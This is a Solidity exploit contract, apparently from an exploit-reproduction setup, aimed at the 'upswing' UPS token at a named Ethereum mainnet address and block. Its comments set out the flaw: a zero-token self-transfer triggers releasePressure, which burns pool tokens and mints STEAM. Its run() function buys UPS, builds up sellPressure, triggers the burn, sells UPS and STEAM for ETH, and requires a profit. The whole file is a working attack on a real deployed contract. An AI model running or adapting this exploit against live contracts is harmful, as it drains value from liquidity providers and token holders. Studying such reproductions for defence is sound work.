pragma solidity ^0.8.24;

import {DexUtils} from "./DexUtils.sol";

/**
 * @title Strategy
 * @notice Exploit strategy contract for upswing
 * @dev Target: 0x35a254223960c18B69C0526c46B013D022E93902 on chain 1 at block 16433820
 *
 * Vulnerability: The UPS token contract allows users to trigger releasePressure via self-transfer of zero tokens.
 * releasePressure burns UPS from the UNIv2 liquidity pool and mints STEAM tokens to the caller, proportional to
 * their sellPressure. sellPressure accumulates when selling UPS to the UNIv2 pair. By selling a small amount of UPS
 * to the pair, we accumulate sellPressure, then trigger releasePressure to burn a larger amount of UPS from the pool,
 * receiving STEAM. The burned UPS increases the price of remaining UPS, allowing us to profit by selling our UPS holdings.
 * Additionally, STEAM can be swapped for ETH.
 *
 * Exploit Strategy:
 * 1. Buy UPS tokens with ETH via DexUtils.
 * 2. Sell a small amount of UPS to the UNIv2 pair to accumulate sellPressure.
 * 3. Trigger releasePressure by self-transfer of zero UPS tokens.
 * 4. Sell remaining UPS tokens for ETH via DexUtils.
 * 5. Convert STEAM tokens to ETH via DexUtils.
 *
 * Expected Outcome: Net gain in ETH balance.
 */
contract Strategy {
    address constant UPS = 0x35a254223960c18B69C0526c46B013D022E93902;
    address constant STEAM = 0xc67a3b1587b2421728750294f0a049e98eb0da65;
    address constant UNIv2 = 0x0e823a8569CF12C1e7C216d3B8aef64A7fC5FB34;

    function run() public {
        uint256 initialBalance = address(this).balance;

        // 1. Buy UPS with 0.001 ETH (adjust as needed)
        uint256 buyAmount = 0.001 ether;
        require(address(this).balance >= buyAmount, "insufficient ETH");
        DexUtils.swapExactBaseTokenToToken(UPS, buyAmount);

        // 2. Sell a small amount of UPS to UNIv2 pair to accumulate sellPressure
        uint256 upsBalance = IERC20(UPS).balanceOf(address(this));
        require(upsBalance > 0, "no UPS bought");
        // Sell 1e18 wei (1 UPS token) - tiny relative to balance
        uint256 sellAmount = 1e18;
        if (sellAmount > upsBalance) {
            sellAmount = upsBalance / 10;
        }
        // Transfer UPS to UNIv2 pair (this counts as a sell)
        require(IERC20(UPS).transfer(UNIv2, sellAmount), "transfer failed");

        // 3. Trigger releasePressure via self-transfer of zero tokens
        require(IERC20(UPS).transfer(address(this), 0), "self-transfer failed");

        // 4. Sell remaining UPS for ETH
        uint256 remainingUPS = IERC20(UPS).balanceOf(address(this));
        if (remainingUPS > 0) {
            DexUtils.swapExactTokenToBaseToken(UPS, remainingUPS);
        }

        // 5. Convert STEAM to ETH
        uint256 steamBalance = IERC20(STEAM).balanceOf(address(this));
        if (steamBalance > 0) {
            DexUtils.swapExactTokenToBaseToken(STEAM, steamBalance);
        }

        uint256 finalBalance = address(this).balance;
        require(finalBalance > initialBalance, "exploit did not profit");
    }

    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
